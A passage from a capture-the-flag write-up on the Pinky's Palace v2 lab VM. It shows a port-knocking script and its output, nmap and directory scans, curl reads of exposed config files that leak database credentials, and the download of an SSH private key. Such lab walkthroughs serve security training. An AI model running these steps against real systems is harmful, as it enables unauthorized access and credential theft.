class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Success =&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the script, and find the correct sequence to open the ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 knock.py            
Trying  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  8890  7000   666
Trying  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  8890   666  7000
Trying  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  7000  8890   666
Trying  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  7000   666  8890

Success &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  7000   666  8890
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can check if the filtered ports are open simply performing a re-scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p4655&lt;/span&gt;,7654,31337 192.168.179.178
...
PORT      STATE SERVICE
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can discover the service and version of the available ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p4655&lt;/span&gt;,7654,31337 192.168.179.178
...
PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
7654/tcp  open  http    nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings:
|   GenericLines, NULL:
|     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Welcome to The Daemon &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]
|     This is soon to be our backdoor
|     into Pinky&lt;span class=&quot;s1&quot;&gt;'s Palace.
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky'&lt;/span&gt;s Palace.
|     HTTP/1.0
|   SIPOptions:
|     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Welcome to The Daemon &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]
|     This is soon to be our backdoor
|     into Pinky&lt;span class=&quot;s1&quot;&gt;'s Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: &amp;lt;sip:nm@nm&amp;gt;;tag=root
|     &amp;lt;sip:nm2@nm2&amp;gt;
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: &amp;lt;sip:nm@nm&amp;gt;
|_    Accept: application/sdp
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumeration-on-port-7654&quot;&gt;Enumeration on port 7654&lt;/h3&gt;

&lt;p&gt;The web service that runs on port 7654 contains a login form, but we don’t know the credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran gobuster in order to discover any interesting information, but nothing.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://pinkydb:7654 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,html
...
http://pinkydb:7654/index.php            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 134]
http://pinkydb:7654/login.php            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 545]
http://pinkydb:7654/config.php           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, I ran gobuster again this time specifying the IP address instead of the host name.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.179.178:7654 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;
...
http://192.168.179.178:7654/apache               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 185] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.168.179.178:7654/apache/]
http://192.168.179.178:7654/nginx                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 185] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.168.179.178:7654/nginx/] 
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this ocasion, two directories were found, then a simple enumeration with dirb under the apache directory discovered the same content as on port 80.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://192.168.179.178:7654/apache/ &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
...
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.179.178:7654/apache/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://192.168.179.178:7654/apache/.htaccess &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:235&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+ http://192.168.179.178:7654/apache/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:418&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.178:7654/apache/secret/       
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.178:7654/apache/wordpress/  
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.178:7654/apache/wp-admin/    
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.178:7654/apache/wp-content/  
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.178:7654/apache/wp-includes/ 
+ http://192.168.179.178:7654/apache/xmlrpc.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:3065&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When verifying the resources found, I could see that it is possible to download the content web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use curl to download and read the wordpress configuration file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.179.178:7654/apache/wp-config.php 
...
/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; The name of the database &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;WordPress &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'pwp_db'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'pinkywp'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'pinkydbpass_wp'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Database Charset to use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;creating database tables. &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_CHARSET'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'utf8mb4'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; The Database Collate type. Don&lt;span class=&quot;s1&quot;&gt;'t change this if in doubt. */
define('&lt;/span&gt;DB_COLLATE&lt;span class=&quot;s1&quot;&gt;', '');
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under the nginx directory, the php files of the login form that run on port 7654 was found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://192.168.179.178:7654/nginx/pinkydb/
...
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.179.178:7654/nginx/pinkydb/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.178:7654/nginx/pinkydb/html/    
                                                                          
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Entering directory: http://192.168.179.178:7654/nginx/pinkydb/html/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://192.168.179.178:7654/nginx/pinkydb/html/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:134&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We list the connection to the database.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.179.178:7654/nginx/pinkydb/html/config.php
&amp;lt;?php
        define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'secretpinkdbuser'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASS'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'pinkyssecretdbpass'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'secretsdb'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_connect&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DB_HOST,DB_USER,DB_PASS,DB_NAME&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;listing the login.php file, we see a link to a page that redirects a user when they have successfully logged in.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.179.178:7654/nginx/pinkydb/html/login.php | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;
&amp;lt;?php
        include&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;config.php&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_real_escape_string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$PASS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_real_escape_string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pass'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$PASS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; md5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PASS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$statement&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id FROM users WHERE username = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' and password = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PASS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_query&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$statement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_fetch_array&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;,MYSQLI_ASSOC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$active&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'active'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_num_rows&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: http://pinkydb:7654/pageegap.php?1337=filesselif1001.php&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;center&amp;gt;Invalid Username or Password!&amp;lt;/center&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This contains a link to an rsa key and a note.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We first download the private key to the attacking machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://pinkydb:7654/credentialsdir1425364865/id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We review the note, it contains the username for the rsa key.&lt;/p&gt;

